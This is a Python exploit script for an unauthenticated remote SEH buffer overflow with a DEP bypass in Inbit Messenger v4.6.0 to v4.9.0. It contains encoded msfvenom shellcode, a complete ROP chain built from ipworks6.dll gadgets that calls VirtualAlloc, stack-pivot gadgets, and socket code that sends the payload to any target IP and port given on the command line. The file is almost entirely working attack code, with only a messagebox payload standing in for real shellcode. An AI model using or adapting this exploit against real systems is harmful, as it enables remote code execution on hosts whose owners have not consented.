#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys, socket, struct, argparse, logging

"""
/opt/metasploit-framework/bin/msfvenom \
  -p windows/messagebox \
  ICON=WARNING          \
  TEXT="get wrecked"    \
  TITLE="LOLZ"          \
  EXITFUNC=thread       \
  -f py                 \
  -v SHELLCODE          \
  -e x86/shikata_ga_nai \
  -b '\x3E'           
"""
SHELLCODE =  b""
SHELLCODE += b"\xba\xbd\x3d\x03\xfa\xd9\xc9\xd9\x74\x24\xf4"
SHELLCODE += b"\x5b\x31\xc9\xb1\x41\x31\x53\x14\x03\x53\x14"
SHELLCODE += b"\x83\xc3\x04\x5f\xc8\xda\x11\x04\xea\xa9\xc1"
SHELLCODE += b"\xce\x3c\x80\xb8\x59\x0e\xed\xd9\x2e\x01\xdd"
SHELLCODE += b"\xaa\x46\xee\x96\xdb\xba\x65\xee\x2b\x49\x07"
SHELLCODE += b"\xcf\xa0\x7b\xc0\x40\xaf\xf6\xc3\x06\xce\x29"
SHELLCODE += b"\xdc\x58\xb0\x42\x4f\xbf\x15\xdf\xd5\x83\xde"
SHELLCODE += b"\x8b\xfd\x83\xe1\xd9\x75\x39\xfa\x96\xd0\x9e"
SHELLCODE += b"\xfb\x43\x07\xea\xb2\x18\xfc\x98\x44\xf0\xcc"
SHELLCODE += b"\x61\x77\xcc\xd3\x32\xfc\x0c\x5f\x4c\x3c\x43"
SHELLCODE += b"\xad\x53\x79\xb0\x5a\x68\xf9\x62\x8b\xfa\xe0"
SHELLCODE += b"\xe1\x91\x20\xe2\x1e\x43\xa2\xe8\xab\x07\xee"
SHELLCODE += b"\xec\x2a\xf3\x84\x09\xa7\x02\x73\x98\xf3\x20"
SHELLCODE += b"\x9f\xfa\x38\x9a\x97\xd5\x6a\x52\x42\xac\x50"
SHELLCODE += b"\x0d\x03\xe1\x5a\x22\x49\x16\xfd\x45\x91\x19"
SHELLCODE += b"\x88\xff\x6a\x5d\x65\x31\x92\xc1\xfe\xd2\x77"
SHELLCODE += b"\x50\xe8\x65\x88\xab\x17\xf0\x32\x5c\x8f\x6f"
SHELLCODE += b"\xd1\x7c\x0e\x18\x1a\x4f\xbe\xbc\x34\xda\xcd"
SHELLCODE += b"\x59\xb7\x14\xea\x2a\x6b\x71\x06\xa2\x72\x2f"
SHELLCODE += b"\xe9\xe1\x7e\x59\xd7\x5a\xc4\xf1\x75\x17\x86"
SHELLCODE += b"\x85\x65\x8c\xa4\x61\xca\x33\xb7\x8d\x9c\x93"
SHELLCODE += b"\x68\x52\x7c\x4c\x25\xdd\x30\xd6\x84\x3a\x40"
SHELLCODE += b"\xba\xc2\xb8\xd9\xa0\x63\xaa\xbc\x42\x2c\x44"
SHELLCODE += b"\x49\xf9\xa9\xf7\xdd\x9a\x54\x8c\x3d\x54\x5e"
SHELLCODE += b"\xe4\x71\xb2\x6b\x7c\x68\x8b\xb9\x14\x5a\xbf"
SHELLCODE += b"\x6c\xbb\x65\xef\xbe\xfb\xc9\xef\x94\xf3"

BANNER = """\033[0m\033[1;35m
╔════════════════════════════════════════════════════════════════════════════════╗
║\033[0m Inbit Messenger v4.6.0 - v4.9.0 Unauthenticated Remote SEH Overflow DEP Bypass \033[1;35m║
╚════════════════════════════════════════════════════════════════════════════════╝\033[0m
 by: \033[1;36m █████╗      ██████╗ ███████╗██╗   ██╗
     \033[1;36m██╔══██╗     ██╔══██╗██╔════╝██║   ██║
     \033[1;36m███████║ ███ ██████╔╝█████╗   ██╗ ██═╝
     \033[1;36m██╔══██║     ██╔══██╗██╔══╝     ██╔╝  
     \033[1;36m██║  ██║     ██║  ██║███████╗   ██║   
     \033[1;36m╚═╝  ╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   
\033[0m"""

BAD_BYTES = b"\x3e" # >
PAYLOAD_LENGTH = 2000

nSEH = b"L0Lz"                       # NOTE: not used
SEH  = struct.pack("<I", 0x2636e91e) # ipworks6.dll | mov eax, dword [ebp+0x0C] ; push ecx ; mov ecx, edi ; call dword [eax+0x2C] 

# NOTE: sets the TEB's ACTIVATION_CONTEXT_STACK.ActiveFrame = NULL
NULL_ACT_CTX_STUB  = b"\x31\xC0\xBB\x00\x10"
NULL_ACT_CTX_STUB += b"\x00\x00\x64\x8B\x48"
NULL_ACT_CTX_STUB += b"\x18\x39\x99\xA8\x01"
NULL_ACT_CTX_STUB += b"\x00\x00\x7C\x0A\x8B"
NULL_ACT_CTX_STUB += b"\x99\xA8\x01\x00\x00"
NULL_ACT_CTX_STUB += b"\x89\x03\xEB\x06\x89"
NULL_ACT_CTX_STUB += b"\x81\xB0\x01\x00\x00" 

PLACEHOLDERS = [
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# KERNEL32!VirtualAllocStub
# https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  0x41414141, # virtual address of KERNEL32!VirtualAllocStub from IAT
  0x42424242, # address of shellcode (same as lpAddress)
  0x69696969, # arg1: lpAddress 
  0x00000200, # arg2: dwSize (512 bytes)
  0x00001000, # arg3: flAllocationType (MEM_COMMIT = 0x00001000)
  0x00000040, # arg4: flProtect (PAGE_EXECUTE_READWRITE = 0x00000040)
]

ROP = [
  # NOTE: EDI = virtual address of KERNEL32!VirtualAllocStub
  0x2637abeb, # pop eax ; ret  
  0x263b4150, # // IAT for KERNEL32!VirtualAllocStub
  0x2635262e, # mov eax, dword [eax] ; pop esi ; retn 0x0004
  0x69696969, # // esi = junk
  0x2634c723, # push eax ; pop edi ; pop esi ; ret 
  0x69696969, # // junk from 'retn 0x0004' @ 0x2635262e
  0x69696969, # // esi = junk
  # NOTE: ESI = stack address of KERNEL32!VirtualAllocStub placeholder
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffff7c, # // ecx = -132
  0x263ac3f6, # add eax, ecx ; ret  
  0x2634c744, # push eax ; pop esi ; retn 0x0004 
  # NOTE: write KERNEL32!VirtualAllocStub placeholder
  0x2635805a, # mov dword [esi], edi ; pop edi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2634c744
  0x69696969, # // edi = junk
  0x69696969, # // esi = junk
  # NOTE: ESI = stack address of lpAddress placeholder
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffff4c, # // ecx = -180
  0x263ac3f6, # add eax, ecx ; ret  
  0x2634c744, # push eax ; pop esi ; retn 0x0004 
  # NOTE: EAX = stack address of shellcode after ROP chain
  0x2636f279, # pop ebp ; ret 
  0x69696969, # // junk from 'retn 0x0004' @ 0x2634c744 
  0x0000015c, # // ebp = 348
  0x2639fa5d, # add eax, ebp ; ret  
  # NOTE: write lpAddress placeholder
  0x263adf17, # mov dword [esi], eax ; pop eax ; pop esi ; ret  
  0x69696969, # // eax = junk
  0x69696969, # // esi = junk
  # NOTE: ESI = stack address of return placeholder
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffff04, # // ecx = -252
  0x263ac3f6, # add eax, ecx ; ret  
  0x2634c744, # push eax ; pop esi ; retn 0x0004 
  # NOTE: EAX = stack address of shellcode after ROP chain
  0x2636f279, # pop ebp ; ret 
  0x69696969, # // junk from 'retn 0x0004' @ 0x2634c744 
  0x00000160, # // ebp = 352
  0x2639fa5d, # add eax, ebp ; ret  
  # NOTE: write return address placeholder
  0x263adf17, # mov dword [esi], eax ; pop eax ; pop esi ; ret  
  0x69696969, # // eax = junk
  0x69696969, # // esi = junk
  # NOTE: stack pivot to placeholders
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xfffffeb0, # // ecx = -336
  0x263ac3f6, # add eax, ecx ; ret  
  0x263a5ded, # xchg eax, esp ; xor eax, eax ; pop edi ; pop esi ; pop ebx ; ret
  # NOTE: END OF CHAIN
  0x69696969, 
]

def exploit(targetIp:str, targetPort:int) -> None:
  pkt  = b""
  pkt += b"".join([struct.pack("<I", _) for _ in PLACEHOLDERS])
  pkt += (b"A" * (40 - len(pkt)))
  # NOTE: SEH stack pivot starts here for gadget @ 0x263a5ded
  pkt += nSEH    # 'pop edi' from gadget @ 0x263a5ded
  pkt += SEH     # 'pop esi' from gadget @ 0x263a5ded
  pkt += b'L0Lz' # 'pop ebx' from gadget @ 0x263a5ded
  # NOTE: pivot stack just past the gadget @ 0x263a5ded
  pkt += struct.pack("<I", 0x263ac8ec) # ipworks6.dll | add esp, 0x20 ; pop ebp ; ret
  # NOTE: filler up to the second SEH pivot gadget (minus 16 for 3x POP and 0x263ac8ec gadget)
  pkt += (b"C" * (0x2C - 16))
  # NOTE: second SEH stack pivot gadget to point stack to nSEH
  pkt += struct.pack("<I", 0x263a5ded) # ipworks6.dll | xchg eax, esp ; xor eax, eax ; pop edi ; pop esi ; pop ebx ; ret
  pkt += b'L0Lz' # 'pop ebp' from gadget @ 0x263ac8ec
  # NOTE: gadget @ 0x263ac8ec pivots the stack here to begin execution
  pkt += b"".join([struct.pack("<I", _) for _ in ROP])
  # NOTE: shellcode follows right after ROP chain from *static* offsets in chain
  pkt += NULL_ACT_CTX_STUB
  pkt += (b"\x90" * 32) # NOP sled for shikata_ga_nai decoder
  pkt += SHELLCODE
  # NOTE: need to send 1600+ bytes to overwrite beyond top of thread's stack
  pkt += (b"B" * (PAYLOAD_LENGTH - len(pkt)))
  # NOTE: check for bad bytes
  for c in pkt:
    if c in BAD_BYTES:
      logging.error(f"found bad byte 0x{c:02x} in payload")
      sys.exit(-1)
  logging.info(f"sending {len(pkt)} byte payload to {targetIp}:{targetPort} ...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((targetIp, targetPort))
  s.send(b"<" + pkt)
  s.close()
  logging.success("DONE")

if __name__ == '__main__':
  # parse arguments
  parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, usage=BANNER)
  parser.add_argument('-t', '--target', help='target IP',   type=str, required=True)
  parser.add_argument('-p', '--port',   help='target port', type=int, required=False, default=10883)
  args = parser.parse_args()
  # define logger
  logging.basicConfig(format='[%(asctime)s][%(levelname)s] %(message)s', datefmt='%d %b %Y %H:%M:%S', level='INFO')
  logging.SUCCESS = logging.CRITICAL + 1
  logging.addLevelName(logging.SUCCESS, '\033[0m\033[1;32mGOOD\033[0m')
  logging.addLevelName(logging.ERROR,   '\033[0m\033[1;31mFAIL\033[0m')
  logging.addLevelName(logging.WARNING, '\033[0m\033[1;33mWARN\033[0m')
  logging.addLevelName(logging.INFO,    '\033[0m\033[1;36mINFO\033[0m')
  logging.success = lambda msg, *args: logging.getLogger(__name__)._log(logging.SUCCESS, msg, args)
  # print banner
  print(BANNER)
  # run exploit
  exploit(args.target, args.port)